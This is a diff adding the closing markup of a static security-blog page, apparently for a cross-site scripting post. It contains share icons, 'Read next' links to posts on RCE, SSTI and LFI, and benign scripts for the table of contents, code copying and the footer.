+                <path d="M333328 63295c-12254 5480-25456 9122-39241 10745 14123-8458 24924-21861 30080-37819-13200 7807-27871 13533-43416 16596-12499-13281-30252-21537-49919-21537-37762 0-68336 30591-68336 68330 0 5326 591 10537 1748 15562-56820-2880-107194-30081-140915-71467-6049 10435-9250 22300-9250 34367v8c0 23696 12031 44654 30389 56876-11202-333-21739-3457-30991-8519v854c0 33138 23554 60789 54852 67039-5734 1557-11787 2417-18023 2417-4417 0-8673-455-12905-1224 8742 27139 33975 46923 63857 47500-23430 18356-52858 29286-84939 29286-5537 0-10931-339-16318-984 30326 19458 66251 30727 104844 30727 125735 0 194551-104198 194551-194543 0-3002-67-5911-191-8852 13354-9553 24932-21609 34097-35333l31-31-6 4z"></path>
+              </svg>
+            </a>
+            <a href="https://www.facebook.com/sharer.php?u=http://localhost:2368/cross-site-scripting-isuk4/" target="_blank" class="group relative bg-white dark:bg-[#151719] h-12 w-12 flex justify-center items-center rounded-full border dark:border-gray-600">
+              <svg class="w-4 h-4 group-hover:fill-[var(--color-primary)] fill-gray-500 dark:fill-gray-500" shape-rendering="geometricPrecision" text-rendering="geometricPrecision" image-rendering="optimizeQuality" fill-rule="evenodd" clip-rule="evenodd" viewBox="0 0 640 640">
+                <path d="M380.001 120.001h99.993V0h-99.993c-77.186 0-139.986 62.8-139.986 139.986v60h-80.009V320h79.985v320h120.013V320h99.994l19.996-120.013h-119.99v-60.001c0-10.843 9.154-19.996 19.996-19.996v.012z"></path>
+              </svg>
+            </a>
+            <button onclick="copyToClipboard()" class="group relative bg-white dark:bg-[#151719] h-12 w-12 flex justify-center items-center rounded-full border dark:border-gray-600">
+              <svg class="h-4 w-4 group-hover:fill-[var(--color-primary)] fill-gray-500 dark:fill-gray-500" viewBox="0 0 111.07 122.88" >
+                <g>
+                  <path class="st0" d="M97.67,20.81L97.67,20.81l0.01,0.02c3.7,0.01,7.04,1.51,9.46,3.93c2.4,2.41,3.9,5.74,3.9,9.42h0.02v0.02v75.28 v0.01h-0.02c-0.01,3.68-1.51,7.03-3.93,9.46c-2.41,2.4-5.74,3.9-9.42,3.9v0.02h-0.02H38.48h-0.01v-0.02 c-3.69-0.01-7.04-1.5-9.46-3.93c-2.4-2.41-3.9-5.74-3.91-9.42H25.1c0-25.96,0-49.34,0-75.3v-0.01h0.02 c0.01-3.69,1.52-7.04,3.94-9.46c2.41-2.4,5.73-3.9,9.42-3.91v-0.02h0.02C58.22,20.81,77.95,20.81,97.67,20.81L97.67,20.81z M0.02,75.38L0,13.39v-0.01h0.02c0.01-3.69,1.52-7.04,3.93-9.46c2.41-2.4,5.74-3.9,9.42-3.91V0h0.02h59.19 c7.69,0,8.9,9.96,0.01,10.16H13.4h-0.02v-0.02c-0.88,0-1.68,0.37-2.27,0.97c-0.59,0.58-0.96,1.4-0.96,2.27h0.02v0.01v3.17 c0,19.61,0,39.21,0,58.81C10.17,83.63,0.02,84.09,0.02,75.38L0.02,75.38z M100.91,109.49V34.2v-0.02h0.02 c0-0.87-0.37-1.68-0.97-2.27c-0.59-0.58-1.4-0.96-2.28-0.96v0.02h-0.01H38.48h-0.02v-0.02c-0.88,0-1.68,0.38-2.27,0.97 c-0.59,0.58-0.96,1.4-0.96,2.27h0.02v0.01v75.28v0.02h-0.02c0,0.88,0.38,1.68,0.97,2.27c0.59,0.59,1.4,0.96,2.27,0.96v-0.02h0.01 h59.19h0.02v0.02c0.87,0,1.68-0.38,2.27-0.97c0.59-0.58,0.96-1.4,0.96-2.27L100.91,109.49L100.91,109.49L100.91,109.49 L100.91,109.49z"></path>
+                </g>
+              </svg>
+            </button>
+          </div>
+        </div>
+    </div>
+  </article>
+
+  <div class="flex gap-4 items-center mt-16">
+    <div class="border-0 border-b w-full border-b-gray-200 dark:border-b-gray-500"></div>
+    <p class="text-gray-500 text-xs uppercase dark:text-gray-400">end</p>
+    <div class="border-0 border-b w-full border-b-gray-200 dark:border-b-gray-500"></div>
+  </div>
+
+
+  <div class="mt-8 pb-24">
+                <h4 class="font-bold text-xl">Read next</h4>
+            <div class="grid sm:grid-cols-3 gap-6 mt-6">
+                    <div>
+    <a class="block overflow-hidden rounded cursor-pointer" href="../getting-rce-from-web-via-ftp-exploit/index.html">
+        <picture>
+    <!-- Serve the AVIF format if the browser supports it -->
+    <!-- Remove this block when using animated images as feature images -->
+    <source 
+        srcset="/content/images/size/w2000/format/avif/2024/03/Group-9--1-.png 300w,
+                /content/images/size/w2000/format/avif/2024/03/Group-9--1-.png 600w,
+                /content/images/size/w2000/format/avif/2024/03/Group-9--1-.png 1000w,
+                /content/images/size/w2000/format/avif/2024/03/Group-9--1-.png 2000w"
+        sizes="(max-width: 800px) 300px, 600px" 
+        type="image/avif"
+    >
+    <!-- Serve the WebP format if the browser supports it -->
+    <source 
+        srcset="/content/images/size/w2000/format/webp/2024/03/Group-9--1-.png 300w,
+                /content/images/size/w2000/format/webp/2024/03/Group-9--1-.png 600w,
+                /content/images/size/w2000/format/webp/2024/03/Group-9--1-.png 1000w,
+                /content/images/size/w2000/format/webp/2024/03/Group-9--1-.png 2000w"
+        sizes="(max-width: 800px) 300px, 600px" 
+        type="image/webp"
+    >
+    <!-- Serve original file format as a fallback -->
+    <img
+        height="300"
+        width="100%"
+        srcset="../content/images/size/w2000/2024/03/Group-9--1-.png 300w,
+               ../content/images/size/w2000/2024/03/Group-9--1-.pngg 600w,
+              ../content/images/size/w2000/2024/03/Group-9--1-.pngng 1000w,
+             ../content/images/size/w2000/2024/03/Group-9--1-.pngpng 2000w"
+        sizes="(max-width: 800px) 300px, 600px"
+        src="../content/images/size/w2000/2024/03/Group-9--1-.png"
+        alt="Getting RCE from web via ftp exploit"
+        class="w-full rounded aspect-[16/9] object-cover cursor-pointer transform hover:scale-105 transition duration-500"
+        loading="lazy"
+    >
+</picture>    </a>
+    <div class="mt-4 flex items-center gap-2 font-bold leading-sm capitalize text-indigo-500 flex-wrap md:flex-nowrap md:line-clamp">
+    </div>
+    <a href="../getting-rce-from-web-via-ftp-exploit/index.html" class=" block mt-4 " style="letter-spacing: -0.5px;">Getting RCE from web via ftp exploit</a>
+    <p class="mt-4 text-sm text-gray-400 dark:text-gray-500 tracking-tight flex items-center gap-2"> Mar 20, 2024 <span aria-hidden="true">&bull;</span> 5 mins</p>
+</div>
+
+                    <div>
+    <a class="block overflow-hidden rounded cursor-pointer" href="../get-rce-with-ssti/index.html">
+        <picture>
+    <!-- Serve the AVIF format if the browser supports it -->
+    <!-- Remove this block when using animated images as feature images -->
+    <source 
+        srcset="/content/images/size/w2000/format/avif/2024/03/Desktop---3.png 300w,
+                /content/images/size/w2000/format/avif/2024/03/Desktop---3.png 600w,
+                /content/images/size/w2000/format/avif/2024/03/Desktop---3.png 1000w,
+                /content/images/size/w2000/format/avif/2024/03/Desktop---3.png 2000w"
+        sizes="(max-width: 800px) 300px, 600px" 
+        type="image/avif"
+    >
+    <!-- Serve the WebP format if the browser supports it -->
+    <source 
+        srcset="/content/images/size/w2000/format/webp/2024/03/Desktop---3.png 300w,
+                /content/images/size/w2000/format/webp/2024/03/Desktop---3.png 600w,
+                /content/images/size/w2000/format/webp/2024/03/Desktop---3.png 1000w,
+                /content/images/size/w2000/format/webp/2024/03/Desktop---3.png 2000w"
+        sizes="(max-width: 800px) 300px, 600px" 
+        type="image/webp"
+    >
+    <!-- Serve original file format as a fallback -->
+    <img
+        height="300"
+        width="100%"
+        srcset="../content/images/size/w2000/2024/03/Desktop---3.png 300w,
+               ../content/images/size/w2000/2024/03/Desktop---3.pngg 600w,
+              ../content/images/size/w2000/2024/03/Desktop---3.pngng 1000w,
+             ../content/images/size/w2000/2024/03/Desktop---3.pngpng 2000w"
+        sizes="(max-width: 800px) 300px, 600px"
+        src="../content/images/size/w2000/2024/03/Desktop---3.png"
+        alt="Get RCE With SSTI"
+        class="w-full rounded aspect-[16/9] object-cover cursor-pointer transform hover:scale-105 transition duration-500"
+        loading="lazy"
+    >
+</picture>    </a>
+    <div class="mt-4 flex items-center gap-2 font-bold leading-sm capitalize text-indigo-500 flex-wrap md:flex-nowrap md:line-clamp">
+    </div>
+    <a href="../get-rce-with-ssti/index.html" class=" block mt-4 " style="letter-spacing: -0.5px;">Get RCE With SSTI</a>
+    <p class="mt-4 text-sm text-gray-400 dark:text-gray-500 tracking-tight flex items-center gap-2"> Mar 29, 2024 <span aria-hidden="true">&bull;</span> 4 mins</p>
+</div>
+
+                    <div>
+    <a class="block overflow-hidden rounded cursor-pointer" href="../lfi/index.html">
+        <picture>
+    <!-- Serve the AVIF format if the browser supports it -->
+    <!-- Remove this block when using animated images as feature images -->
+    <source 
+        srcset="/content/images/size/w2000/format/avif/2024/03/1_CxSKz8eS5jxZll2ILqFTwA.webp 300w,
+                /content/images/size/w2000/format/avif/2024/03/1_CxSKz8eS5jxZll2ILqFTwA.webp 600w,
+                /content/images/size/w2000/format/avif/2024/03/1_CxSKz8eS5jxZll2ILqFTwA.webp 1000w,
+                /content/images/size/w2000/format/avif/2024/03/1_CxSKz8eS5jxZll2ILqFTwA.webp 2000w"
+        sizes="(max-width: 800px) 300px, 600px" 
+        type="image/avif"
+    >
+    <!-- Serve the WebP format if the browser supports it -->
+    <source 
+        srcset="/content/images/size/w2000/format/webp/2024/03/1_CxSKz8eS5jxZll2ILqFTwA.webp 300w,
+                /content/images/size/w2000/format/webp/2024/03/1_CxSKz8eS5jxZll2ILqFTwA.webp 600w,
+                /content/images/size/w2000/format/webp/2024/03/1_CxSKz8eS5jxZll2ILqFTwA.webp 1000w,
+                /content/images/size/w2000/format/webp/2024/03/1_CxSKz8eS5jxZll2ILqFTwA.webp 2000w"
+        sizes="(max-width: 800px) 300px, 600px" 
+        type="image/webp"
+    >
+    <!-- Serve original file format as a fallback -->
+    <img
+        height="300"
+        width="100%"
+        srcset="../content/images/size/w2000/2024/03/1_CxSKz8eS5jxZll2ILqFTwA.webp 300w,
+               ../content/images/size/w2000/2024/03/1_CxSKz8eS5jxZll2ILqFTwA.webpp 600w,
+              ../content/images/size/w2000/2024/03/1_CxSKz8eS5jxZll2ILqFTwA.webpbp 1000w,
+             ../content/images/size/w2000/2024/03/1_CxSKz8eS5jxZll2ILqFTwA.webpebp 2000w"
+        sizes="(max-width: 800px) 300px, 600px"
+        src="../content/images/size/w2000/2024/03/1_CxSKz8eS5jxZll2ILqFTwA.webp"
+        alt="Secrets of LFI🤫"
+        class="w-full rounded aspect-[16/9] object-cover cursor-pointer transform hover:scale-105 transition duration-500"
+        loading="lazy"
+    >
+</picture>    </a>
+    <div class="mt-4 flex items-center gap-2 font-bold leading-sm capitalize text-indigo-500 flex-wrap md:flex-nowrap md:line-clamp">
+    </div>
+    <a href="../lfi/index.html" class=" block mt-4 " style="letter-spacing: -0.5px;">Secrets of LFI🤫</a>
+    <p class="mt-4 text-sm text-gray-400 dark:text-gray-500 tracking-tight flex items-center gap-2"> Mar 12, 2024 <span aria-hidden="true">&bull;</span> 5 mins</p>
+</div>
+
+            </div>
+  </div>
+
+
+<div id="mobile-toc-modal-container" class="fixed z-[9999] hidden justify-center items-center w-full bottom-[72px] lg:bottom-auto lg:top-0 lg:h-1/2">
+  <div id="mobile-toc-modal" class="bg-white dark:bg-[#151719] border dark:border-gray-600 w-full md:w-[450px] flex flex-col justify-center items-center p-3 pb-6 relative">
+    <button onclick="openTOC()" class="absolute top-2 right-2 z-20 flex h-10 w-10 items-center justify-center rounded-md hover:bg-[#E3E8F3] dark:hover:bg-blue-700">
+      <svg fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+        <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"></path>
+      </svg>
+    </button>
+    <p class="font-bold">TOC</p>
+  </di>
+</div>
+
+
+
+<script>
+
+  function openTOC(e){
+    let mobileTocModal = document.querySelector('#mobile-toc-modal')
+    let mobileTocModalContainer = document.querySelector('#mobile-toc-modal-container')
+    let originalToc = document.querySelector('#original-toc')
+
+    mobileTocModalContainer.classList.toggle('hidden')
+    mobileTocModalContainer.classList.toggle('flex')
+ 
+    mobileTocModal.appendChild(originalToc.querySelector('.toc-container'))
+  }
+
+  function scrollToTop(e){
+    window.scrollTo({top: 0, behavior: 'smooth'})
+  }
+
+  function copyToClipboard(){
+    try{
+      navigator.clipboard.writeText(window.location.href)
+      showSuccessToast("Link copied to clipboard")
+    }catch(e){
+      showErrorToast("something went wrong")
+      console.log(e)
+    }
+  }
+</script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.18.2/tocbot.min.js"></script>
+<script>
+  tocbot.init({
+    // Where to render the table of contents.
+    tocSelector: '.toc-container',
+    // Where to grab the headings to build the table of contents.
+    contentSelector: '.prose',
+    // Which headings to grab inside of the contentSelector element.
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    // For headings inside relative or absolute positioned containers within content.
+    hasInnerContainers: true,
+    
+    headingsOffset: 100,
+    scrollSmoothOffset: -100
+  });
+</script>
+
+<script src="../assets/js/prism.js@v=c0682550e4"></script>
+<link rel="stylesheet" href="../assets/css/prism.css@v=c0682550e4.css">
+
+<script>
+  function initCodeCopy() {
+    const codeBlocks = document.querySelectorAll('code[class*="language-"]');
+
+    codeBlocks.forEach((block) => {
+        const lang = parseLanguage(block);
+        const referenceEl = block.parentElement;
+        const parent = block.parentElement.parentElement;
+        
+        const wrapper = document.createElement('div');
+        wrapper.className = 'code-wrapper';
+        parent.insertBefore(wrapper, referenceEl);
+        wrapper.append(block.parentElement);
+
+        const copyBtn = document.createElement('button');
+        copyBtn.setAttribute('class', 'copy-button');
+        copyBtn.setAttribute('data-lang', lang);
+        copyBtn.innerHTML = `${lang} <svg viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0z"/><path d="M7 6V3a1 1 0 0 1 1-1h12a1 1 0 0 1 1 1v14a1 1 0 0 1-1 1h-3v3c0 .552-.45 1-1.007 1H4.007A1.001 1.001 0 0 1 3 21l.003-14c0-.552.45-1 1.007-1H7zM5.003 8L5 20h10V8H5.003zM9 6h8v10h2V4H9v2z" fill="currentColor"/></svg>`;
+
+        wrapper.insertAdjacentElement('beforeend', copyBtn);
+    });
+
+    function parseLanguage(block) {
+        const className = block.className;
+        if (className.startsWith('language')) {
+            const [prefix, lang] = className.split('-');
+            return lang;
+        }
+    }
+
+    function copy(e) {
+        const btn = e.currentTarget;
+        const lang = btn.dataset.lang;
+
+        const text = e.currentTarget.previousSibling.children[0].textContent;
+
+        navigator.clipboard.writeText(text).then(
+            () => {
+                btn.innerHTML = `copied! <svg viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0z"/><path d="M7 6V3a1 1 0 0 1 1-1h12a1 1 0 0 1 1 1v14a1 1 0 0 1-1 1h-3v3c0 .552-.45 1-1.007 1H4.007A1.001 1.001 0 0 1 3 21l.003-14c0-.552.45-1 1.007-1H7zm2 0h8v10h2V4H9v2z" fill="currentColor"/></svg>`;
+                btn.setAttribute('style', 'opacity: 1');
+                
+            },
+            () => alert('failed to copy'),
+        );
+
+        setTimeout(() => {
+            btn.removeAttribute('style');
+            btn.innerHTML = `${lang} <svg viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0z"/><path d="M7 6V3a1 1 0 0 1 1-1h12a1 1 0 0 1 1 1v14a1 1 0 0 1-1 1h-3v3c0 .552-.45 1-1.007 1H4.007A1.001 1.001 0 0 1 3 21l.003-14c0-.552.45-1 1.007-1H7zM5.003 8L5 20h10V8H5.003zM9 6h8v10h2V4H9v2z" fill="currentColor"/></svg>`;
+        }, 3000);
+    }
+
+    const copyButtons = document.querySelectorAll('.copy-button');
+
+    copyButtons.forEach((btn) => {
+        btn.addEventListener('click', copy);
+    });
+}
+
+initCodeCopy()
+</script>
+
+<style>
+  .code-wrapper {
+    position: relative;
+    overflow: hidden;
+    border-radius: 8px;
+  }
+
+  .code-wrapper > pre[class*="language-"] {
+    margin-top: 0;
+  }
+
+  .copy-button {
+    position: absolute;
+    top: 5px;
+    right: 5px;
+    display: flex;
+    align-items: center;
+    color: rgb(230 202 168);
+    cursor: pointer;
+    background: transparent;
+    border: none;
+    font-size: 0.8rem;
+  }
+
+  .copy-button svg {
+    width: 1em;
+    margin-left: 0.25em;
+    opacity: 0.5;
+    transition: opacity 0.3s;
+  }
+
+  .copy-button:hover svg {
+    opacity: 1;
+  }
+</style>
+        </main>
+
+        <div>
+                <div class="hidden lg:block">
+                    <section
+    class="relative gh-canvas bg-black overflow-hidden"
+    style="display:flex;align-item:center;justify-content:center;padding:3rem;"
+>
+    <div class="relative kg-width-wide">
+        <p
+            class="py-5 text-sm text-gray-400 font-medium text-center leading-normal"
+        >Copyright ©
+            <span class="current-year"></span>
+            Isuk4 . All Rights Reserved</p>
+    </div>
+</section>
+
+<script>
+    const currentYear = new Date().getFullYear();
+    document.querySelector('.current-year').textContent = currentYear;
+</script>                </div>
+        </div>
+    </div>
+
+
+    
+
+
+
+</body>
+</html>
